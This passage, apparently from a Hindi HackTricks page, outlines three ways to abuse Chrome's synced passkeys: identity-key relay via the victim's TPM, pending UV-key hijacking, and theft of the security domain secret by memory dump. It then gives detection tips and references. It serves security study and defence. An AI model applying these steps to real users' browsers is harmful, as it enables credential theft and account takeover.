इसका मतलब है कि **hardware binding डिवाइस से बाहर export होने से रोकता है, लेकिन compromised endpoint पर उसी user द्वारा उपयोग को नहीं रोकता**।

### व्यावहारिक दुरुपयोग के रास्ते

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Chrome के LevelDB से `WebauthnCredentialSpecifics` enumerate करें।
   - Passkey login शुरू करें और एक नया WebAuthn challenge प्राप्त करें।
   - Cloud-authenticator request binding पर हस्ताक्षर करने के लिए पीड़ित के TPM पर चुराए गए `wrapped_identity_private_key` blob का उपयोग करें।
   - प्राप्त assertion को relying party तक relay करें।
   - यह तब विशेष रूप से उपयोगी है जब RP `userVerification=preferred` स्वीकार करता है या **`UV=0`** वाले assertions को अस्वीकार करने में विफल रहता है।
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - `passkey_enclave_state` हटाकर या कोई मान्य signed `device/forget` operation भेजकर फिर से onboarding करने के लिए बाध्य करें।
   - यदि onboarding के बाद डिवाइस **`uv_key_pending`** स्थिति में रहता है, तो attacker-controlled UV public key register करें।
   - यदि provider नई UV key के attestation / secure-hardware origin को verify नहीं करता, तो बाद में attacker key से किए गए signatures को **`UV=1`** माना जाता है।
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
   - Recovery या rejoin के लिए बाध्य करें, ताकि Chrome synced-passkey master secret fetch करे।
   - `passkey_enclave_state` के फिर से बनने/बदलने पर नज़र रखें, फिर plaintext **security domain secret (SDS)** के memory में मौजूद रहते हुए Chrome memory dump करें।
   - हर `WebauthnCredentialSpecifics` record में encrypted fields decrypt करने और portable WebAuthn private keys हासिल करने के लिए प्राप्त SDS का उपयोग करें।

### DFIR / detection के विचार

- `passkey_enclave_state` के **हटाए जाने/फिर से बनाए जाने** पर निगरानी रखें।<sup>[[4]](#references)</sup>
- गैर-ब्राउज़र प्रक्रियाओं द्वारा Chrome **`Sync Data\LevelDB`** तक असामान्य पहुँच पर alert करें।
- **Chrome memory dumps** या संदिग्ध cross-process memory access पर alert करें।
- Google Password Manager recovery PIN के बार-बार आने वाले prompts या अनपेक्षित re-onboarding की जाँच करें।
- ध्यान रखें कि synced passkeys के लिए WebAuthn **`signCount`** अक्सर उपयोगी नहीं होता, क्योंकि यह स्थिर रह सकता है; इसलिए clone का पारंपरिक पता लगाना कमज़ोर होता है।

## References

- [1] [Unit 42 – उच्च-मूल्य वाले क्षेत्रों को निशाना बनाने वाले वर्षों से अनदेखे अभियानों की जाँच](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP के ज़रिए Word VBA macro phishing → hMailServer credential decryption → SYSTEM तक पहुँचने के लिए Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ink Dragon के भीतर: relay network और गुप्त offensive operation की कार्यप्रणाली का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: passwordless authentication में एक नया attack surface](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Microsoft सिस्टम और नेटवर्क पर हमले](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory data store वास्तव में कैसे काम करता है: NTDS.dit के भीतर (भाग 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho ने Still Toolkit के साथ अपने cyber-espionage शस्त्रागार का विस्तार किया](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW function और `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` backup mode](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – सक्रिय sessions समाप्त करना](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
